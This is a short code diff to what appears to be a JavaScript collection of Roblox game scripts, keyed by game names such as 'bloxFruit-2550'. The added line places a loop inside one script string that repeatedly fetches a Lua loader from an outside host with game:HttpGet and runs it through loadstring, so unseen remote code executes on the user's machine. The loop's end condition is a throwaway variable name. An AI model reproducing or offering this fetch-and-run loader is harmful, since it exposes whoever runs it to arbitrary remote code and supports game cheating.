@@ -649,7 +649,8 @@ export default {
                   ["Shiny Rare"] = true,
                   ["Shiny Legendary"] = true
                 }
-              }`
+              }
+              repeat wait()spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(10)until Joebiden`;
           break;
         case 'bloxFruit-2550' :
           script = `
